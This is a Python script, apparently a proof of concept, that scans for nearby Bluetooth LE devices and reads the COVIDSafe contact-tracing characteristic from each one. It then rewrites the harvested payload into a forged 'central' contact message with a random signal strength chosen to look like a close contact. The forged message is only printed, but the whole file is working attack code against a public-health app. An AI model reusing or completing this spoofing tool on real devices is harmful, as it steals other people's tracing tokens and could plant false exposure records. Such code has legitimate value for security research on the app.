#!/usr/bin/python3

import asyncio
import bleak
import random as rand
import json
import time

serviceUUID = "b82ab3fc-1595-4f6a-80f0-fe094cc218f9"
readUUID = "b82ab3fc-1595-4f6a-80f0-fe094cc218f9"

async def scan():
    print("Beginning scan")
    addresses = []
    devices = await bleak.BleakScanner.discover()

    for d in devices:
        addresses.append(d.address)
    
    print(f"Found devices {addresses}")
    return addresses

async def read_gatt(address):
    try:
        print(f"Attempting to scan address {address}")
        async with bleak.BleakClient(address) as client:
            serviceCollection = await client.get_services()
            services = serviceCollection.services

            # known bug in implementation of COVIDSafe causes
            # multiple duplicate services whenever Bluetooth is turned on or off
            # so we can't just search by UUID
            for service in services:
                if services[service].uuid == serviceUUID:
                    characteristic = services[service].get_characteristic(readUUID)
                    break

            charVal = await client.read_gatt_char(characteristic)
            print(f"Found characteristic value: {charVal}")
            charVal = json.loads(charVal.decode())

            # change to look like a central message
            del charVal["modelP"]
            charVal["modelC"] = ""
            charVal["rs"] = rand.randint(-50, 20) # high value more likely to register as close contact
            print(f"Created contact message {charVal}")

    except Exception as e: # rule out all devices which aren't running the app
        print(e)

loop = asyncio.get_event_loop()

# Discover devices
task = loop.create_task(scan())
loop.run_until_complete(task)
addresses = task.result()

for address in addresses:
    task = loop.create_task(read_gatt(address))
    loop.run_until_complete(task)
